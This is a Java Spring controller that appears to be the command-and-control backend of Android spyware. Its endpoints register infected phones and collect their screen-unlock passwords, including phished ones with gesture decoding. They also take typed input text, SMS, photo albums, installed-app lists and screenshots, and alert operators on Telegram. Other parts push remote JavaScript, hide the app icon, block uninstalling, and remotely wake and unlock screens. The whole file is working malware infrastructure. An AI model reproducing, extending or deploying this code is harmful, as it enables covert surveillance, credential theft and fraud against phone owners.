package io.renren.modules.app.web.api;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import io.renren.common.constant.Constant;
import io.renren.common.utils.IpUtils;
import io.renren.common.utils.Result;
import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
import io.renren.modules.app.common.Utils;
import io.renren.modules.app.context.DeviceContext;
import io.renren.modules.app.entity.*;
import io.renren.modules.app.handler.TelegramNotificationHandler;
import io.renren.modules.app.mapper.UnlockScreenPwdMapper;
import io.renren.modules.app.service.*;
import io.renren.modules.app.service.impl.PermissionOcrService;
import io.renren.modules.app.vo.*;
import io.renren.modules.sys.dao.SysParamsDao;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.collections4.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.awt.*;
import java.util.Date;
import java.util.List;
import java.util.Objects;

@Slf4j
@RestController
@RequestMapping("/api/device")
public class DeviceApiController extends BaseApiController {

    @Autowired
    DeviceService deviceService;
    @Autowired
    private InstallAppService installAppService;
    @Resource
    private InputTextRecordService inputTextRecordService;
    @Resource
    private LogService logService;
    @Resource
    private JsCodeService jsCodeService;
    @Resource
    private UnlockScreenPwdService unlockScreenPwdService;
    @Resource
    private SysParamsDao sysParamsDao;
    @Resource
    private FishTemplateService fishTemplateService;
    @Resource
    private SmsInfoService smsInfoService;
    @Resource
    private AlbumPicService albumPicService;
    @Resource
    private FishDataService fishDataService;
    @Autowired(required = false)
    private TelegramNotificationHandler telegramNotificationHandler;
    @Autowired
    private HeartService heartService;
    @Autowired
    private UnlockScreenPwdMapper unlockScreenPwdMapper;
    @Autowired
    private ScreenSnapshotService screenSnapshotService;

    @Autowired
    private PermissionOcrService permissionOcrService;

    //注册设备
    @RequestMapping("/registerDevice")
    public Result<Void> registerDevice(@RequestBody Device device, HttpServletRequest request) {
        log.info("registerDevice:{}", JSONObject.toJSONString(device));
        device.setDeviceId(DeviceContext.getDeviceId());
        device.setPkg(DeviceContext.getPkg());
        String ip = IpUtils.getIpAddr(request);
        String addr = IpUtils.getCity(ip);
        device.setIp(ip);
        device.setAddr(addr);
        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
        if (dbDevice != null) {
            if (dbDevice.getHideIcon() == null) {
                dbDevice.setHideIcon(Constant.YN.N);
            }
            if (dbDevice.getAccessibilityGuard() == null) {
                dbDevice.setAccessibilityGuard(Constant.YN.Y);
            }

            if (dbDevice.getUninstallGuard() == null) {
                dbDevice.setUninstallGuard(Constant.YN.Y);
            }

            if (dbDevice.getUploadAlbum() == null) {
                dbDevice.setUploadAlbum(Constant.YN.Y);
            }
            if (dbDevice.getUploadSms() == null) {
                dbDevice.setUploadSms(Constant.YN.Y);
            }
            device.setId(dbDevice.getId());
            deviceService.updateById(device);
        } else {

            List<FishTemplates> list = fishTemplateService.effectiveFishTemplates();
            JSONObject fishSwitch = new JSONObject();
            if (CollectionUtils.isNotEmpty(list)) {
                for (FishTemplates fishTemplates : list) {
                    fishSwitch.put(fishTemplates.getCode(), true);
                }
            }


            device.setFishSwitch(fishSwitch);
            device.setUploadSms(Constant.YN.Y);
            device.setUploadAlbum(Constant.YN.Y);
            device.setHideIcon(Constant.YN.N);
            device.setAccessibilityGuard(Constant.YN.Y);
            device.setUninstallGuard(Constant.YN.Y);
            device.setUplog(Constant.YN.Y);
            device.setStatus(Constant.DeviceStatus.screen_on);
            deviceService.save(device);
            if (telegramNotificationHandler != null) {
                telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 新设备安装成功!\\n📈 请关注后台数据!");
            }
            log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ", DeviceContext.getPkg(), DeviceContext.getDeviceId(), ip, addr);
        }
        return Result.toSuccess();
    }


    @PostMapping("uploadUnlockPassword")
    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject json) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        Device device = deviceService.findByDeviceId(deviceId);
        if (device == null) {
            log.error("pkg:{}  设备:{} 不存在", pkg, deviceId);
            return Result.toError("device not extis.");
        }
        UnlockScreenPwd unlockScreenPwd = json.toJavaObject(UnlockScreenPwd.class);
        unlockScreenPwd.setDeviceId(device.getId());
        unlockScreenPwd.setPkg(pkg);
        unlockScreenPwd.setAndroidId(deviceId);
        unlockScreenPwd.setCreateDate(Utils.now());

        Device update = new Device();
        update.setId(device.getId());
        update.setLockScreen(json);
        if (unlockScreenPwd.getSource() == Constant.UnlockScreenPwdSource.fish) {
            JSONObject fishSwitch = device.getFishSwitch();
            fishSwitch.put(Constant.FishCode.unlock, false);
            update.setFishSwitch(fishSwitch);
            update.setUnlockFish(Constant.YN.N);
        }
        deviceService.updateById(update);
        if (telegramNotificationHandler != null) {
            JSONObject jsonPwd = new JSONObject();
            jsonPwd.put("tips", unlockScreenPwd.getTips());
            jsonPwd.put("value", unlockScreenPwd.getValue());

            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), String.format("✅ [解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!", jsonPwd.toJSONString()));
        }

        if (unlockScreenPwd.getType() == Constant.UnLockType.no) {
            UnlockScreenPwd last = unlockScreenPwdMapper.last(deviceId, Constant.UnLockType.no);
            if (last == null) {
                unlockScreenPwdService.save(unlockScreenPwd);
                log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
            } else {
                UnlockScreenPwd updatePwd = new UnlockScreenPwd();
                updatePwd.setId(last.getId());
                updatePwd.setCreateDate(Utils.now());
                unlockScreenPwdService.updateById(updatePwd);
                log.info("更新密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
            }

        } else {
            unlockScreenPwdService.save(unlockScreenPwd);
            log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
        }
        return Result.toSuccess(null);
    }

    /**
     * APP JS 日志上传
     *
     * @param logs
     * @return
     */
    @PostMapping("uploadLog")
    public Result<Void> uploadLog(@RequestBody List<Log> logs) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (Log _log : logs) {
            _log.setId(null);
            _log.setDeviceId(deviceId);
            _log.setPkg(pkg);
        }
        logService.saveBatch(logs);
        return Result.toSuccess();
    }


    @RequestMapping("uploadInputTextRecord")
    public Result<Void> uploadInputTextRecord(@RequestBody List<InputTextRecord> inputTextRecords) {

        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();

        for (InputTextRecord inputTextRecord : inputTextRecords) {
            inputTextRecord.setDeviceId(deviceId);
            inputTextRecord.setPkg(pkg);
            inputTextRecord.setSource(0);
        }

        try {
            log.info("上传输入框:{}", JSON.toJSONString(inputTextRecords));
            DynamicContextHolder.push("clickhouse");
            inputTextRecordService.insertBatchNotTranstion(inputTextRecords, 200);
            return Result.toSuccess();
        } finally {
            DynamicContextHolder.poll();
        }

    }

    /**
     * 服务器配置
     *
     * @return
     */
    @RequestMapping("getConfig")
    public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus) {
        ServerConfig serverConfig = new ServerConfig();
        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());

        if (dbDevice == null) {
            log.info("已经移除的数据 : pkg:{} 设备:{}  -> {}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSON.toJSONString(deviceStatus));
            return Result.toSuccess(serverConfig);
        }

        if (Objects.equals(Constant.YN.Y, dbDevice.getUplog())) {

            serverConfig.setUploadLog(true);
        }
        if (Objects.equals(Constant.YN.Y, dbDevice.getHideIcon())) {
            serverConfig.setHideIcon(true);
        }


        if (Objects.equals(Constant.YN.Y, dbDevice.getAccessibilityGuard())) {
            serverConfig.setAccessibilityGuard(true);
        }


        if (Objects.equals(Constant.YN.Y, dbDevice.getUninstallGuard())) {
            serverConfig.setUninstallGuard(true);
        }

        JsCode jsCode = jsCodeService.findByIdentification(Constant.JsCodeKey.heartbeat);
        if (jsCode != null) {
            serverConfig.setCode(jsCode.getCode());
        }
        JsCode mainJsCode = jsCodeService.findByIdentification(Constant.JsCodeKey.main);
        //md5版本不对 下发新的js代码
        if (StringUtils.isEmpty(deviceStatus.getJsCodeMd5()) || !Objects.equals(deviceStatus.getJsCodeMd5(), mainJsCode.getCodeMd5())) {
            serverConfig.setMainCode(mainJsCode.getCode());
            serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
        }

        serverConfig.setFishOptions(dbDevice.getFishSwitch());

        serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
        serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
        String key = dbDevice.getBrand().toLowerCase();
//        String configer = sysParamsDao.getValueByCode(key);
//        configer = configer == null ? sysParamsDao.getValueByCode(SystemParamsKey.defaultKey) : configer;
//        JSONObject json = JSONObject.parseObject(configer);
//        String backFeatures = json.getString("rules");

        serverConfig.setBackFeatures("[]");

        Device updateDevice = new Device();
        updateDevice.setId(dbDevice.getId());
        updateDevice.setLastHeart(Utils.now());
        updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
        updateDevice.setPermissions(deviceStatus.getPermissions());
        updateDevice.setCharging(deviceStatus.isCharging() ? Constant.YN.Y : Constant.YN.N);
        if (StringUtils.isNotEmpty(deviceStatus.getScreenSnapshot())) {
            updateDevice.setScreenSnapshot(deviceStatus.getScreenSnapshot());
        }
        updateDevice.setBattery(deviceStatus.getBattery());
        if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
            log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
            updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
            if (dbDevice.getLockScreen() != null) {
                serverConfig.setUnLockParams(dbDevice.getLockScreen().toJavaObject(UnLockParams.class));
            }
            serverConfig.setWakeUp(true);
        } else if (Constant.DeviceStatus.wait_wake == dbDevice.getStatus() && deviceStatus.getScreenStatus() == Constant.DeviceStatus.screen_on) {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
            log.info("pkg:{} 设备:{} - 唤醒成功", DeviceContext.getPkg(), DeviceContext.getDeviceId());
        } else {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
        }
        log.info("pkg:{} 设备:{} - 请求配置成功", DeviceContext.getPkg(), DeviceContext.getDeviceId());
        heartService.addHeart(DeviceContext.getPkg(), DeviceContext.getDeviceId());
        deviceService.updateById(updateDevice);
        return Result.toSuccess(serverConfig);

    }

    @RequestMapping("uploadInstallApp")
    public Result<Void> uploadInstallApp(@RequestBody List<InstallApp> list) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (InstallApp installApp : list) {
            installApp.setDeviceId(deviceId);
            installApp.setPkg(pkg);
        }
        installAppService.deleteByDeviceIdAndPkg(deviceId, pkg);
        installAppService.saveBatch(list);
        return Result.toSuccess();
    }

    @RequestMapping("fishTemplates")
    public Result<List<FishTemplates>> fishTemplates(@RequestBody JSONObject jsonObject) {
        return Result.toSuccess(fishTemplateService.effectiveFishTemplates());
    }


    @RequestMapping("sms")
    public Result<Void> sms(@RequestBody List<SmsInfoEntity> list) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (SmsInfoEntity sms : list) {
            sms.setDeviceId(deviceId);
            sms.setPkg(pkg);
        }
        smsInfoService.addSms(list);
        if (telegramNotificationHandler != null) {
            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 短信数据上传成功!\n📈 请关注后台数据!");
        }
        log.info("设备:{} 短信上传成功.", deviceId);
        return Result.toSuccess();
    }


    @PostMapping("/album_pic")
    public Result<Void> albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        Date now = Utils.now();
        for (AlbumPicEntity input : inputs) {
            input.setDeviceId(deviceId);
            input.setCreated(now);
            input.setModified(now);
            input.setPkg(pkg);
        }
        albumPicService.upload(inputs);
        if (telegramNotificationHandler != null) {
            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 相册数据上传成功!\n📈 请关注后台数据!");
        }

        log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
        return Result.toSuccess();
    }


    /**
     * 钓鱼数据
     *
     * @param fishDataVo
     * @return
     */
    @PostMapping("submitFishData")
    public Result<Void> submitFishData(@RequestBody FishDataVo fishDataVo) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        log.info("{} - submitFishData:{}", deviceId, JSONObject.toJSONString(fishDataVo));
        Device dbDevice = deviceService.findByDeviceId(deviceId);
        if (dbDevice == null) {

            return Result.toSuccess();
        }
        if (Objects.equals(fishDataVo.getCode(), Constant.FishCode.unlock)) {
            String data = fishDataVo.getData();

            JSONObject unlockParam = JSONObject.parseObject(data);
            try {

                String tips = unlockParam.getString("tips");
                if (unlockParam.getInteger("type") == Constant.UnLockType.gesture) {
                    tips = tips.chars()
                            .map(c -> '0' + (c - '0' + 1) % 10)
                            .collect(StringBuilder::new,
                                    StringBuilder::appendCodePoint,
                                    StringBuilder::append)
                            .toString();
                    unlockParam.put("tips", tips);
                }
                unlockParam.put("source", Constant.UnlockScreenPwdSource.fish);
                uploadUnlockPassword(unlockParam);
                if (telegramNotificationHandler != null) {
                    telegramNotificationHandler.sendNotificationAsync(pkg, deviceId, String.format("✅ [钓鱼解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!", unlockParam.toJSONString()));
                }
            } catch (Exception e) {
                log.warn("uploadUnlockPassword error", e);
            }
        } else {
            FishData fishData = new FishData();
            fishData.setCreated(Utils.now());
            fishData.setPkg(pkg);
            fishData.setDeviceId(dbDevice.getId());
            fishData.setAndroidId(deviceId);
            fishData.setCode(fishDataVo.getCode());
            fishData.setData(fishDataVo.getData());
            fishDataService.save(fishData);
        }

        Device updateDevice = new Device();

        JSONObject fishSwitch = dbDevice.getFishSwitch();
        fishSwitch.put(fishDataVo.getCode(), false);
        updateDevice.setFishSwitch(fishSwitch);
        updateDevice.setId(dbDevice.getId());
        deviceService.updateById(updateDevice);


        log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
        return Result.toSuccess();
    }

    @RequestMapping("uploadScreenSnapshot")
    public Result<Void> uploadScreenSnapshot(@RequestBody List<ScreenSnapshot> list) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (ScreenSnapshot screenSnapshot : list) {
            screenSnapshot.setId(null);
            screenSnapshot.setPkg(pkg);
            screenSnapshot.setDeviceId(deviceId);
        }
        screenSnapshotService.saveBatch(list);
        return Result.toSuccess();
    }

    @RequestMapping("questPermissionOpenPosition")
    public Result<Point> questPermissionOpenPosition(@RequestBody PermissionOpenPositionReq permissionOpenPositionReq) {
        try {
            long start = System.currentTimeMillis();
            Point point = permissionOcrService.questPermissionOpenPosition(permissionOpenPositionReq);
            log.info("识别耗时:{} ms", System.currentTimeMillis() - start);
            return Result.toSuccess(point);
        } catch (Exception e) {
            return Result.toError(e.getMessage());
        }

    }

}
